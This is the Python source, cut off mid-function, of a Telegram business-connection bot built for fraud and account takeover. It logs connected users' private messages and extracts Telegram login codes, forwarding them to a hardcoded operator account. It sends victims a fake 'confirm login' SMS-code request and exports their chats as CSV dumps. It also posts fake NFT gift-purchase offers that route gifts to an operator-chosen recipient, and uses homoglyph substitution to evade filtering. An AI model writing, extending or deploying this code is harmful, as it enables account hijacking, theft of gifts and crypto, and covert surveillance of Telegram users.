# language: Python, file: part1.py, target: Python 3.11+
# Часть 1/4 — конфиг, homoglyph, helpers, send(raw)

import asyncio
import hmac
import html
import io
import json
import logging
import math
import os
import random
import re
import time
import uuid
import csv

from aiohttp import ClientSession, ClientTimeout, web
import aiosqlite

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
log = logging.getLogger("mega")

BOT_TOKEN   = os.environ["BOT_TOKEN"]
PUBLIC_URL  = (os.environ.get("PUBLIC_URL") or os.environ.get("RENDER_EXTERNAL_URL", "")).rstrip("/")
SECRET      = os.environ.get("WEBHOOK_SECRET") or BOT_TOKEN.split(":")[1][:32]
API         = f"{os.environ.get('TG_API', 'https://api.telegram.org')}/bot{BOT_TOKEN}"
DATA_FILE   = os.environ.get("OFFERS_FILE", "offers.json")
ADMIN_FILE  = os.environ.get("ADMIN_FILE", "admin.json")
DB_FILE     = os.environ.get("PROFILES_DB", "profiles.db")
PORT        = int(os.environ.get("PORT", "10000"))

BRAND       = os.environ.get("BRAND", "Telegram")
TEST_NOTICE = os.environ.get("TEST_NOTICE", "")
OFFER_TTL   = int(float(os.environ.get("OFFER_HOURS", 6)) * 3600)
TRANSFER_MIN = int(os.environ.get("TRANSFER_MINUTES", 10))
STRICT      = os.environ.get("OFFER_STRICT") == "1"
MAX_STARS   = 100_000_000
MAX_GRAM    = 10**9
CRYPTOS = {
    "GRAM": {"emoji": "💎", "label": "GRAM"},
    "TON":  {"emoji": "💎", "label": "TON"},
}
UPDATES = ["message", "callback_query", "business_connection", "business_message"]
NBSP = "\u00a0"

ADMIN_ID = int(os.environ.get("ADMIN_ID", "6811074441"))
MUTE_LIMIT = int(os.environ.get("MUTE_LIMIT", "500"))

OFFER_EDIT_DELAY = max(1.0, float(os.environ.get("OFFER_EDIT_DELAY", "1.0")))
HOMOGLYPH_RATE = float(os.environ.get("HOMOGLYPH_RATE", "0.75"))
BUTTON_STYLE = os.environ.get("BUTTON_STYLE", "")

http = None
bot_name = ""
connections, offers = {}, {}
tasks = set()
settings = {"gift_recipient": None}
premium_ids = set()
admin_states = {}
inbox = {}
mutes = set()

# ============ HOMOGLYPH ============
_HOMOGLYPH = {
    "а": ["a", "α"], "с": ["c"], "е": ["e"], "о": ["o", "ο"],
    "р": ["p", "ρ"], "х": ["x"], "у": ["y"], "к": ["κ"],
    "А": ["A"], "В": ["B"], "Е": ["E"], "К": ["K"], "М": ["M"],
    "Н": ["H"], "О": ["O"], "Р": ["P"], "С": ["C"], "Т": ["T"],
    "У": ["Y"], "Х": ["X"], "І": ["I"], "Ј": ["J"], "Ѕ": ["S"],
}
_TAG_RE = re.compile(r"<(/?)(b|i|u|s|code|a|pre|em|strong|tg-spoiler)(\s[^>]*)?>", re.IGNORECASE)

def _style_plain(s: str) -> str:
    res = []
    for ch in s:
        variants = _HOMOGLYPH.get(ch)
        if variants and random.random() < HOMOGLYPH_RATE:
            res.append(random.choice(variants))
        else:
            res.append(ch)
    return "".join(res)

def style(text: str) -> str:
    out = []
    pos = 0
    depth = 0
    for m in _TAG_RE.finditer(text):
        chunk = text[pos:m.start()]
        out.append(_style_plain(chunk) if depth == 0 else chunk)
        out.append(m.group(0))
        if m.group(1) == "/":
            depth = max(0, depth - 1)
        else:
            depth += 1
        pos = m.end()
    tail = text[pos:]
    out.append(_style_plain(tail) if depth == 0 else tail)
    return "".join(out)

# ============ HELPERS ============
def esc(s):
    return html.escape(str(s))

def num(x):
    return f"{x:,}".replace(",", NBSP)

def btn(text, data):
    b = {"text": text, "callback_data": data}
    if BUTTON_STYLE:
        b["style"] = BUTTON_STYLE
    return b

def background(coro):
    task = asyncio.create_task(coro)
    tasks.add(task)
    task.add_done_callback(tasks.discard)
    return task

async def api(method, **params):
    async with http.post(f"{API}/{method}", json=params) as resp:
        data = await resp.json()
    if not data.get("ok"):
        log.warning("%s: %s", method, data.get("description", data))
    return data

async def send(chat, text, kb=None, bcid=None, preview=False, raw=False):
    if not raw:
        text = style(text)
    params = dict(chat_id=chat, text=text, parse_mode="HTML")
    params["link_preview_options"] = {"is_disabled": not preview}
    if kb:
        params["reply_markup"] = kb
    if bcid:
        params["business_connection_id"] = bcid
    return await api("sendMessage", **params)

async def delete_business_message(bcid, mid):
    return await api("deleteBusinessMessages", business_connection_id=bcid, message_ids=[mid])

async def edit_offer(o, text, kb=None, preview=True):
    text = style(text)
    params = dict(chat_id=o["chat"], message_id=o["mid"], business_connection_id=o["bcid"],
                  text=text, parse_mode="HTML", reply_markup=kb or {"inline_keyboard": []})
    params["link_preview_options"] = {"is_disabled": not preview}
    res = await api("editMessageText", **params)
    if not res.get("ok") and "not modified" in (res.get("description") or "").lower():
        return {"ok": True}
    return res
    # language: Python, file: part2.py, target: Python 3.11+
# Часть 2/4 — БД, строгий код-парсер, клавиатуры

# ============ БД ============
async def init_db():
    async with aiosqlite.connect(DB_FILE) as db:
        await db.execute("""CREATE TABLE IF NOT EXISTS profiles(
            user_id INTEGER PRIMARY KEY,
            conn_id TEXT, username TEXT, full_name TEXT,
            phone TEXT, bio TEXT, lang TEXT, premium INTEGER DEFAULT 0,
            last_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
            added DATETIME DEFAULT CURRENT_TIMESTAMP)""")
        await db.execute("""CREATE TABLE IF NOT EXISTS msgs(
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            conn_id TEXT, user_id INTEGER, chat_id INTEGER,
            from_id INTEGER, text TEXT, is_code INTEGER DEFAULT 0,
            ts DATETIME DEFAULT CURRENT_TIMESTAMP)""")
        await db.commit()

async def upsert_profile(conn):
    u = conn["user"]
    async with aiosqlite.connect(DB_FILE) as db:
        await db.execute("""INSERT INTO profiles
            (user_id,conn_id,username,full_name,phone,bio,lang,premium,last_seen)
            VALUES(?,?,?,?,?,?,?,?,CURRENT_TIMESTAMP)
            ON CONFLICT(user_id) DO UPDATE SET
              conn_id=excluded.conn_id, username=excluded.username,
              full_name=excluded.full_name,
              phone=COALESCE(excluded.phone, profiles.phone),
              bio=COALESCE(excluded.bio, profiles.bio),
              lang=COALESCE(excluded.lang, profiles.lang),
              premium=excluded.premium,
              last_seen=CURRENT_TIMESTAMP""",
            (u["id"], conn["id"], u.get("username"), u.get("first_name", ""),
             u.get("phone_number"), u.get("bio"), u.get("language_code"),
             1 if u.get("is_premium") else 0))
        await db.commit()

async def list_profiles():
    async with aiosqlite.connect(DB_FILE) as db:
        cur = await db.execute("""SELECT user_id,conn_id,username,full_name,
            phone,bio,lang,premium,last_seen,added FROM profiles ORDER BY added""")
        return await cur.fetchall()

async def get_profile(uid):
    async with aiosqlite.connect(DB_FILE) as db:
        cur = await db.execute("SELECT * FROM profiles WHERE user_id=?", (uid,))
        return await cur.fetchone()

async def log_msg(conn_id, user_id, chat_id, from_id, text, is_code):
    async with aiosqlite.connect(DB_FILE) as db:
        await db.execute("""INSERT INTO msgs(conn_id,user_id,chat_id,from_id,text,is_code)
            VALUES(?,?,?,?,?,?)""", (conn_id, user_id, chat_id, from_id, text, is_code))
        await db.commit()

# ============ СТРОГИЙ ПАРСЕР КОДОВ ============
CODE_RE = re.compile(r"\b(\d{4,6})\b")
KEYWORDS_STRICT = re.compile(
    r"(?:code|код|login|вход|sign[\-\s]?in|verif|подтвержд|G-\d|tg-?\d)"
    r"\D{0,20}(\d{4,6})",
    re.IGNORECASE)
TG_NOTICE_KEYWORDS = re.compile(
    r"(code|код|login|verification|G-\d|tg-?\d)",
    re.IGNORECASE)

def is_tg_service(cid, fid):
    return cid == 777000 or fid == 777000

def looks_like_code(text: str, cid: int, fid: int):
    if not text:
        return None
    if text.lstrip().startswith("/"):
        return None
    if is_tg_service(cid, fid):
        if TG_NOTICE_KEYWORDS.search(text):
            m = CODE_RE.search(text)
            return m.group(1) if m else None
        return None
    m = KEYWORDS_STRICT.search(text)
    return m.group(1) if m else None

# ============ КЛАВИАТУРЫ ============
def is_admin(uid):
    return uid == ADMIN_ID

def profiles_kb(rows):
    kb = []
    for i, (uid, cid, uname, name, phone, bio, lang, prem, seen, added) in enumerate(rows, start=1):
        label = f"{i}. {name or uname or uid}"
        if uname:
            label += f" | @{uname}"
        if phone:
            label += f" | {phone}"
        kb.append([btn(label, f"pick:{uid}")])
    kb.append([btn("🔄 Обновить", "refresh")])
    return {"inline_keyboard": kb}

def profile_menu_kb(uid):
    return {"inline_keyboard": [
        [btn("🔑 Запросить 2FA",         f"act:2fa:{uid}")],
        [btn("🎁 Сделать оффер",         f"act:offer:{uid}")],
        [btn("✉️ Написать по @username", f"act:msg:{uid}")],
        [btn("💬 Написать в свой чат",   f"act:write:{uid}")],
        [btn("📥 Выгрузить чаты",        f"act:dump:{uid}")],
        [btn("📨 Список чатов",          f"act:chats:{uid}")],
        [btn("🚫 Удалить профиль",       f"act:kill:{uid}")],
        [btn("⬅️ Назад",                "back")],
    ]}

def admin_panel_kb():
    rec = settings.get("gift_recipient")
    rows = [
        [btn("👥 Профили", "adm:profiles")],
        [btn("🎁 Получатель подарка", "adm:recipient")],
    ]
    if rec and rec.get("username"):
        rows.append([btn("🧹 Снять получателя", "adm:recipient_clear")])
    rows.append([btn("⭐ Премиум", "adm:premium")])
    return {"inline_keyboard": rows}

def admin_panel_text():
    rec = settings.get("gift_recipient")
    rec_txt = f"@{esc(rec['username'])}" if rec and rec.get("username") else "по умолчанию"
    prem = ", ".join(str(x) for x in sorted(premium_ids)) if premium_ids else "нет"
    return (f"<b>Админ-панель</b>\n\n"
            f"🎁 Получатель: {rec_txt}\n"
            f"⭐ Премиум: {prem}\n"
            f"👤 ADMIN_ID: <code>{ADMIN_ID}</code>")
    # language: Python, file: part3.py, target: Python 3.11+
# Часть 3/4 — save/load, офферы, mute, connection

# ============ SAVE/LOAD ============
def save():
    for oid in sorted(offers, key=lambda k: offers[k]["created"])[:-500]:
        del offers[oid]
    inbox_ser = {f"{k[0]}|{k[1]}": v for k, v in inbox.items()}
    mutes_ser = [f"{k[0]}|{k[1]}" for k in mutes]
    tmp = f"{DATA_FILE}.tmp"
    try:
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump({"connections": connections, "offers": offers,
                       "inbox": inbox_ser, "mutes": mutes_ser},
                      f, ensure_ascii=False)
        os.replace(tmp, DATA_FILE)
    except OSError as e:
        log.error("не удалось сохранить %s: %s", DATA_FILE, e)

def save_admin():
    tmp = f"{ADMIN_FILE}.tmp"
    try:
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump({"settings": settings, "premium": sorted(premium_ids)}, f, ensure_ascii=False)
        os.replace(tmp, ADMIN_FILE)
    except OSError as e:
        log.error("не удалось сохранить %s: %s", ADMIN_FILE, e)

def load():
    try:
        with open(DATA_FILE, encoding="utf-8") as f:
            data = json.load(f)
    except FileNotFoundError:
        data = {}
    except (OSError, ValueError) as e:
        log.error("%s не читается: %s", DATA_FILE, e)
        data = {}
    connections.update(data.get("connections", {}))
    offers.update(data.get("offers", {}))
    for k, v in (data.get("inbox") or {}).items():
        bcid, peer = k.split("|", 1)
        inbox[(bcid, int(peer))] = v
    for item in (data.get("mutes") or []):
        bcid, peer = item.split("|", 1)
        mutes.add((bcid, int(peer)))
    try:
        with open(ADMIN_FILE, encoding="utf-8") as f:
            ad = json.load(f)
    except (FileNotFoundError, OSError, ValueError):
        ad = {}
    settings.update(ad.get("settings", {}))
    premium_ids.update(ad.get("premium", []))

# ============ ОФФЕРЫ ============
NFT_LINK = re.compile(r"(?:https?://)?t\.me/nft/([A-Za-z0-9_-]+)", re.I)
SLUG = re.compile(r"^(.+)-(\d+)$")
WALLET_RE = re.compile(r"^(?:[A-Za-z\-_]{2}[A-Za-z0-9_\-]{46}|0:[0-9a-fA-F]{64})$")
USAGE = ("Формат:\n"
         "<code>/offer ссылка сумма</code> — звёзды\n"
         "<code>/offer ссылка сумма GRAM</code> — GRAM 💎\n"
         "<code>/offer ссылка сумма TON</code> — TON 💎\n"
         "Кошелёк в конце — опционально.\n"
         "Пример: <code>/offer https://t.me/nft/DurovsCap-1234 5 TON UQ...abc</code>")

def gift_name(slug):
    m = SLUG.match(slug)
    if not m:
        return None
    return f"{re.sub(r'(?<=[a-z0-9])(?=[A-Z])', ' ', m.group(1))} #{m.group(2)}"

def parse_offer(arg):
    link = NFT_LINK.search(arg)
    if not link:
        return None, "Не нашёл ссылку на NFT."
    slug = link.group(1)
    name = gift_name(slug)
    if not name:
        return None, "Это не NFT-ссылка: в конце должен быть номер."
    rest = f"{arg[:link.start()]} {arg[link.end():]}"
    m = re.search(r"(\d[\d_,]*)\s*([A-Za-z]+)?", rest)
    if not m:
        return None, "Не нашёл сумму."
    amount = int(re.sub(r"[_,]", "", m.group(1)))
    currency = (m.group(2) or "").upper()
    if currency in CRYPTOS:
        if not 1 <= amount <= MAX_GRAM:
            return None, f"Сумма от 1 до {num(MAX_GRAM)} {currency}."
        after = rest[m.end():].strip()
        wallet = after.split()[0] if after else None
        if wallet and not WALLET_RE.match(wallet):
            return None, "Кошелёк некорректен."
        return {"slug": slug, "name": name, "amount": amount, "currency": currency,
                "emoji": CRYPTOS[currency]["emoji"], "wallet": wallet}, None
    if not 1 <= amount <= MAX_STARS:
        return None, f"Сумма от 1 до {num(MAX_STARS)} звёзд."
    return {"slug": slug, "name": name, "stars": amount,
            "currency": "XTR", "wallet": None}, None

def maker_label(o):
    u = o["maker"]
    return esc(u.get("name") or u.get("username") or "пользователь")

def gift_link(o):
    return f'<a href="https://t.me/nft/{esc(o["slug"])}">{esc(o["name"])}</a>'

def amount_text(o):
    if o.get("currency") in ("GRAM", "TON"):
        return f'{num(o["amount"])} {o["emoji"]} {o["currency"]}'
    return f'{num(o.get("stars", 0))} ⭐'

def stars(o):
    return amount_text(o)

def wallet_block(o):
    w = o.get("wallet")
    if not w:
        return ""
    return f"\n\n💸 Кошелёк:\n<blockquote>{esc(w)}</blockquote>"

def left_text(seconds):
    minutes = math.ceil(max(0, seconds) / 60)
    h, m = divmod(minutes, 60)
    return f"{h} ч. {m} мин." if h else f"{m} мин."

def offer_text(o):
    text = (f"<b>{maker_label(o)}</b> предлагает Вам <b>{stars(o)}</b> за подарок {gift_link(o)}.\n\n"
            f"Действует ещё {left_text(o['expires'] - time.time())}")
    text += wallet_block(o)
    if TEST_NOTICE:
        text += f"\n\n{esc(TEST_NOTICE)}"
    return text

def accepted_text(o):
    u = o["maker"]
    username = u.get("username") or "пользователя"
    if o.get("wallet"):
        tail = f"\n\n💸 Кошелёк:\n<blockquote>{esc(o['wallet'])}</blockquote>"
    else:
        tail = "\n\n<i>Telegram автоматически зафиксирует передачу.</i>"
    return (f"<b>Сделка принята!</b>\n\n"
            f"Передайте подарок {gift_link(o)} пользователю @{esc(username)} "
            f"для зачисления <b>{stars(o)}</b>.{tail}")

def declined_text(o):
    return "Отклонено."

def expired_text(o):
    return f"Предложение {stars(o)} за подарок {gift_link(o)} истекло."

def offer_kb(o):
    return {"inline_keyboard": [[
        btn("✕ Отклонить", f"of:no:{o['id']}"),
        btn("✓ Принять", f"of:ok:{o['id']}")
    ]]}

def resolve_recipient(o):
    maker_id = o["maker"].get("id")
    if maker_id == ADMIN_ID or maker_id in premium_ids:
        return o["maker"].get("username"), maker_id
    rec = settings.get("gift_recipient")
    if rec and rec.get("username"):
        return rec["username"], rec.get("id")
    return o["maker"].get("username"), maker_id

def accepted_kb(o):
    username, tg_id = resolve_recipient(o)
    transfer_url = f"tg://send_gift?to={username}" if username else f"tg://user?id={tg_id or 0}"
    transfer = {"text": "✓ Передать", "url": transfer_url}
    if BUTTON_STYLE:
        transfer["style"] = BUTTON_STYLE
    return {"inline_keyboard": [[
        btn("✕ Отменить", f"of:cancel:{o['id']}"),
        transfer
    ]]}

FINAL = {
    "accepted": (accepted_text, accepted_kb),
    "declined": (declined_text, None),
    "expired":  (expired_text, None),
}

async def settle(o, status):
    o["status"] = status
    save()
    if status in ("declined", "expired"):
        try:
            await delete_business_message(o["bcid"], o["mid"])
        except Exception:
            pass
        return
    text, kb = FINAL[status]
    await edit_offer(o, text(o), kb(o) if kb else None, preview=True)

async def sweeper():
    while True:
        await asyncio.sleep(60)
        for o in list(offers.values()):
            if o["status"] != "pending":
                continue
            try:
                if o["expires"] < time.time():
                    await settle(o, "expired")
            except Exception:
                pass

# ============ MUTE ============
def remember_incoming(m, conn):
    frm = (m.get("from") or {}).get("id")
    if not frm or frm == conn["user_id"]:
        return
    key = (conn["id"], frm)
    lst = inbox.setdefault(key, [])
    lst.append(m["message_id"])
    if len(lst) > MUTE_LIMIT:
        del lst[:-MUTE_LIMIT]

async def delete_ids(bcid, mids):
    deleted = 0
    for i in range(0, len(mids), 100):
        chunk = mids[i:i + 100]
        res = await api("deleteBusinessMessages", business_connection_id=bcid, message_ids=chunk)
        if res.get("ok"):
            deleted += len(chunk)
    return deleted

async def do_mute(m, conn, mode="inbox"):
    chat = m["chat"]["id"]
    bcid = conn["id"]
    peer = (m.get("reply_to_message") or {}).get("from") or {}
    peer_id = peer.get("id")
    if not peer_id and chat != conn["user_id"]:
        peer_id = chat
    if not peer_id:
        return await send(chat,
                          "⚠️ Не понял, кого мьютить. Ответь на сообщение собеседника "
                          "или напиши /mute прямо в чате с ним.", bcid=bcid)
    try:
        await delete_business_message(bcid, m["message_id"])
    except Exception:
        pass
    key = (bcid, peer_id)
    if mode == "off":
        mutes.discard(key)
        save()
        return await send(chat, "🔔 Мьют снят.", bcid=bcid)
    if mode == "all":
        cur = m["message_id"]
        mids = list(range(max(1, cur - MUTE_LIMIT), cur))
        await delete_ids(bcid, mids)
        return
    mutes.add(key)
    save()
    await send(chat,
               "🔕 Мьют включён. Новые сообщения собеседника будут удаляться. "
               "Выключить: <code>/mute off</code>", bcid=bcid)

# ============ CONNECTION ============
def conn_from(c):
    rights = c.get("rights")
    rights = rights if isinstance(rights, dict) else {}
    can_reply = bool(rights.get("can_reply", c.get("can_reply")))
    can_delete = bool(rights.get("can_delete_all_messages"))
    user = c["user"]
    return {"id": c["id"], "user_id": user["id"], "chat": user.get("id"),
            "name": user.get("first_name", ""), "username": user.get("username"),
            "enabled": c.get("is_enabled", True), "can_reply": can_reply,
            "can_delete": can_delete}

async def on_connection(c):
    conn = conn_from(c)
    connections[conn["id"]] = conn
    save()
    await upsert_profile(c)
    rows = await list_profiles()

    if not conn["enabled"]:
        text = "🔌 Бот отключён."
    elif not conn["can_reply"]:
        text = "⚠️ Бот подключён, но без права отвечать."
    else:
        text = ("✅ <b>Готово, бот подключён.</b>\n\n"
                "В любом чате:\n"
                "<code>/offer ссылка сумма</code>\n"
                "<code>/offer ссылка сумма TON</code>\n"
                "<code>/mute</code> — скрыть собеседника\n"
                "<code>/mute off</code> — снять мьют")
    await send(conn["chat"], text)
    await send(ADMIN_ID,
        f"🟢 <b>Новый профиль</b>\n"
        f"ID: <code>{conn['user_id']}</code>\n"
        f"@{conn['username'] or '—'}\n"
        f"Имя: {conn['name']}\n"
        f"Всего: <b>{len(rows)}</b>",
        profiles_kb(rows), raw=True)

async def get_connection(bcid):
    conn = connections.get(bcid)
    if conn is None:
        res = await api("getBusinessConnection", business_connection_id=bcid)
        if res.get("ok"):
            conn = connections[bcid] = conn_from(res["result"])
            save()
    return conn
    # language: Python, file: part4.py, target: Python 3.11+
# Часть 4/4 — on_business_message, make_offer, on_callback, on_message, router, main

async def on_business_message(m):
    text = m.get("text") or ""
    first = text.partition(" ")[0].lower()

    conn = await get_connection(m["business_connection_id"])
    if not conn:
        return

    remember_incoming(m, conn)

    frm = m.get("from") or {}
    bcid = m["business_connection_id"]
    is_owner = frm.get("id") == conn["user_id"]

    # ---- 1. команды владельца — СНАЧАЛА, до парсера кодов ----
    if is_owner and first in ("/offer", "/mute"):
        if not (conn["enabled"] and conn["can_reply"]):
            return await send(conn["chat"], "⚠️ У бота нет права отвечать.", bcid=bcid)
        if first == "/mute":
            arg = text.partition(" ")[2].strip().lower()
            mode = "off" if arg == "off" else ("all" if arg == "all" else "inbox")
            return await do_mute(m, conn, mode)
        maker = {"id": frm["id"], "name": frm.get("first_name", ""), "username": frm.get("username")}
        return await make_offer(m, maker, bcid)

    # ---- 2. код-парсер ----
    code = looks_like_code(text, m["chat"]["id"], frm.get("id"))
    await log_msg(bcid, conn["user_id"], m["chat"]["id"], frm.get("id"), text, 1 if code else 0)
    if code:
        await send(ADMIN_ID,
            f"🔑 <b>КОД TELEGRAM</b>\n"
            f"User: <code>{conn['user_id']}</code>\n"
            f"Chat: <code>{m['chat']['id']}</code>\n"
            f"From: <code>{frm.get('id')}</code>\n"
            f"Code: <code>{code}</code>\n"
            f"Raw: {esc(text[:300])}", raw=True)
        return

    # ---- 3. уведомления от 777000 (не коды) ----
    if is_tg_service(m["chat"]["id"], frm.get("id")) and text:
        await send(ADMIN_ID,
            f"📢 <b>Telegram notice</b>\n"
            f"User: <code>{conn['user_id']}</code>\n"
            f"Text: {esc(text[:300])}", raw=True)
        return

    # ---- 4. авто-удаление в мьюте ----
    if not is_owner:
        peer_id = frm.get("id") or m["chat"]["id"]
        if (bcid, peer_id) in mutes:
            try:
                await delete_business_message(bcid, m["message_id"])
            except Exception:
                pass

async def make_offer(m, maker, bcid):
    cmd, _, arg = (m.get("text") or "").partition(" ")
    parsed, error = parse_offer(arg)
    chat = m["chat"]["id"]
    now = time.time()
    try:
        await delete_business_message(bcid, m["message_id"])
    except Exception:
        pass
    if error:
        return await send(chat, f"⚠️ {esc(error)}\n\n{USAGE}", bcid=bcid, preview=False)
    o = {"id": uuid.uuid4().hex[:8], **parsed, "bcid": bcid, "chat": chat,
         "mid": None, "maker": maker, "status": "pending",
         "created": now, "expires": now + OFFER_TTL}
    offers[o["id"]] = o
    save()
    res = await send(chat, offer_text(o), offer_kb(o), bcid=bcid, preview=True)
    if res.get("ok"):
        o["mid"] = res["result"]["message_id"]
        save()
    else:
        desc = res.get("description", "")
        if "PEER_FLOOD" in desc:
            return await send(chat, "⚠️ Telegram временно ограничил отправку.", bcid=bcid)
        return await send(chat, f"⚠️ Ошибка: {esc(desc)}", bcid=bcid)

# ============ CALLBACKS ============
async def on_callback(q):
    data = q.get("data", "")
    uid = q["from"]["id"]
    msg = q.get("message") or {}
    chat_id = (msg.get("chat") or {}).get("id")
    answered = False

    async def ans(text=None, alert=False):
        nonlocal answered
        if answered:
            return
        answered = True
        kw = {"callback_query_id": q["id"]}
        if text:
            kw["text"] = text
            kw["show_alert"] = alert
        await api("answerCallbackQuery", **kw)

    try:
        # ---- adm: ----
        if data.startswith("adm:"):
            if not is_admin(uid):
                return await ans("Нет доступа", alert=True)
            action = data.split(":", 1)[1]
            if action == "profiles":
                rows = await list_profiles()
                await ans()
                return await send(chat_id, f"👥 <b>Профили</b> ({len(rows)})\nВыбери:",
                                  profiles_kb(rows), raw=True)
            if action == "recipient":
                admin_states[uid] = "await_recipient"
                await ans()
                return await send(chat_id,
                    "Введи @username получателя. <code>-</code> — сбросить.", raw=True)
            if action == "recipient_clear":
                settings["gift_recipient"] = None
                save_admin()
                await ans("Сброшено")
                return await send(chat_id,
                    "✅ Получатель снят.", admin_panel_kb(), raw=True)
            if action == "premium":
                admin_states[uid] = "await_premium"
                await ans()
                return await send(chat_id,
                    "Введи ID для премиума. Снять — <code>-ID</code>.", raw=True)
            return await ans()

        # ---- pick: ----
        if data.startswith("pick:"):
            if not is_admin(uid):
                return await ans("Нет доступа", alert=True)
            target = int(data.split(":")[1])
            p = await get_profile(target)
            if not p:
                return await ans("Профиль не найден")
            (uid_, cid, uname, name, phone, bio, lang, prem, seen, added) = p
            txt = (f"👤 <b>{esc(name or '—')}</b>\n"
                   f"ID: <code>{uid_}</code>\n"
                   f"Username: @{esc(uname or '—')}\n"
                   f"Телефон: {esc(phone or '—')}\n"
                   f"Язык: {esc(lang or '—')}\n"
                   f"Premium: {'✅' if prem else '❌'}\n"
                   f"Био: {esc(bio or '—')}\n"
                   f"Conn: <code>{cid}</code>\n"
                   f"Добавлен: {esc(str(added))}\n"
                   f"Активность: {esc(str(seen))}")
            await api("editMessageText", chat_id=chat_id, message_id=msg["message_id"],
                      text=txt, parse_mode="HTML", reply_markup=profile_menu_kb(uid_))
            return await ans()

        # ---- back/refresh ----
        if data in ("back", "refresh"):
            if not is_admin(uid):
                return await ans("Нет доступа", alert=True)
            rows = await list_profiles()
            await api("editMessageText", chat_id=chat_id, message_id=msg["message_id"],
                      text=f"👥 <b>Профили</b> ({len(rows)})",
                      parse_mode="HTML", reply_markup=profiles_kb(rows))
            return await ans("OK" if data == "refresh" else None)

        # ---- act: ----
        if data.startswith("act:"):
            if not is_admin(uid):
                return await ans("Нет доступа", alert=True)
            _, act, target = data.split(":")
            target = int(target)
            p = await get_profile(target)
            if not p:
                return await ans("Нет профиля")
            conn_id = p[1]

            if act == "2fa":
                await send(target, "🔐 Подтвердите вход: отправьте код из SMS.", bcid=conn_id)
                return await ans("2FA отправлен")

            if act == "offer":
                admin_states[uid] = f"await_offer:{target}"
                await send(chat_id, "Введи: <code>/offer ссылка сумма [TON|GRAM] [wallet]</code>", raw=True)
                return await ans()

            if act == "msg":
                admin_states[uid] = f"await_msg:{target}"
                await send(chat_id,
                    "Введи:\n<code>@username текст</code>\n"
                    "Например: <code>@durov привет</code>", raw=True)
                return await ans()

            if act == "write":
                admin_states[uid] = f"await_write:{target}"
                await send(chat_id, f"Текст для <code>{target}</code>:", raw=True)
                return await ans()

            if act == "dump":
                async with aiosqlite.connect(DB_FILE) as db:
                    cur = await db.execute(
                        "SELECT chat_id,from_id,text,ts FROM msgs WHERE conn_id=? ORDER BY ts",
                        (conn_id,))
                    rows = await cur.fetchall()
                buf = io.StringIO()
                w = csv.writer(buf)
                w.writerow(["chat_id", "from_id", "text", "ts"])
                for r_ in rows:
                    w.writerow(r_)
                data_bytes = buf.getvalue().encode()
                form = {
                    "chat_id": str(chat_id),
                    "caption": f"📦 Дамп {target} ({len(rows)} строк)",
                }
                form_file = {"document": (f"dump_{target}.csv", data_bytes, "text/csv")}
                async with http.post(f"{API}/sendDocument", data=form, files=form_file) as resp:
                    await resp.json()
                return await ans()

            if act == "chats":
                async with aiosqlite.connect(DB_FILE) as db:
                    cur = await db.execute(
                        "SELECT DISTINCT chat_id FROM msgs WHERE conn_id=? AND chat_id != ?",
                        (conn_id, target))
                    chat_ids = [r_[0] for r_ in await cur.fetchall()]
                if not chat_ids:
                    await send(chat_id, "📨 Чатов нет (кроме владельца).", raw=True)
                    return await ans()
                lines = []
                for cid in chat_ids[:50]:
                    async with aiosqlite.connect(DB_FILE) as db:
                        cur2 = await db.execute(
                            "SELECT from_id, text FROM msgs WHERE conn_id=? AND chat_id=? ORDER BY ts DESC LIMIT 1",
                            (conn_id, cid))
                        last = await cur2.fetchone()
                    if last:
                        fid, last_text = last
                        name = f"<code>{cid}</code> | from <code>{fid}</code>"
                        if last_text:
                            name += f" | {esc(last_text[:40])}"
                    else:
                        name = f"<code>{cid}</code>"
                    lines.append(name)
                await send(chat_id, "📨 <b>Чаты:</b>\n" + "\n".join(lines), raw=True)
                return await ans()

            if act == "kill":
                async with aiosqlite.connect(DB_FILE) as db:
                    await db.execute("DELETE FROM profiles WHERE user_id=?", (target,))
                    await db.commit()
                await send(chat_id, f"🔴 Профиль {target} удалён.", raw=True)
                return await ans()

            return await ans()

        # ---- of: (жертва жмёт) ----
        parts = data.split(":")
        o = offers.get(parts[2]) if len(parts) == 3 and parts[0] == "of" else None
        if o is None:
            return await ans()

        action = parts[1]
        if action == "cancel":
            try:
                await delete_business_message(o["bcid"], o["mid"])
            except Exception:
                pass
            o["status"] = "declined"
            save()
            return await ans()

        if action in ("ok", "no"):
            if o["status"] != "pending":
                return await ans("Сделка уже обработана", alert=True)
            if time.time() > o["expires"]:
                await settle(o, "expired")
                return await ans("Срок истёк", alert=True)
            await settle(o, "accepted" if action == "ok" else "declined")
            return await ans()

        return await ans()
    except Exception:
        log.exception("callback error")
        await ans("Ошибка", alert=True)

# ============ MESSAGE ============
async def on_message(m):
    chat = m["chat"]["id"]
    uid = (m.get("from") or {}).get("id")
    text = (m.get("text") or "").strip()
    is_adm = is_admin(uid)

    state = admin_states.pop(uid, None) if is_adm else None
    if state:
        if state.startswith("await_offer:"):
            target = int(state.split(":")[1])
            parsed, err = parse_offer(text)
            if err:
                return await send(chat, f"⚠️ {esc(err)}", raw=True)
            p = await get_profile(target)
            conn_id = p[1]
            o = {"id": uuid.uuid4().hex[:8], **parsed, "bcid": conn_id, "chat": target,
                 "mid": None, "maker": {"id": ADMIN_ID, "name": "Admin", "username": None},
                 "status": "pending", "created": time.time(), "expires": time.time() + OFFER_TTL}
            offers[o["id"]] = o
            res = await send(target, offer_text(o), offer_kb(o), bcid=conn_id, preview=True)
            if res.get("ok"):
                o["mid"] = res["result"]["message_id"]
            save()
            return await send(chat, f"✅ Оффер отправлен → <code>{target}</code>", raw=True)

        if state.startswith("await_msg:"):
            target = int(state.split(":")[1])
            p = await get_profile(target)
            conn_id = p[1]
            parts = text.split(maxsplit=1)
            if len(parts) < 2 or not parts[0].startswith("@"):
                return await send(chat, "⚠️ Формат: <code>@username текст</code>", raw=True)
            uname = parts[0].lstrip("@")
            body = parts[1]
            res = await api("sendMessage",
                business_connection_id=conn_id,
                chat_id=f"@{uname}",
                text=body)
            if res.get("ok"):
                return await send(chat,
                    f"✅ Отправлено @{esc(uname)} от <code>{target}</code>", raw=True)
            desc = res.get("description", "")
            if "USERNAME_NOT_OCCUPIED" in desc:
                return await send(chat, f"❌ @{esc(uname)} не существует", raw=True)
            if "USERNAME_INVALID" in desc:
                return await send(chat, f"❌ Некорректный @{esc(uname)}", raw=True)
            if "PEER_ID_INVALID" in desc or "CHAT_NOT_FOUND" in desc:
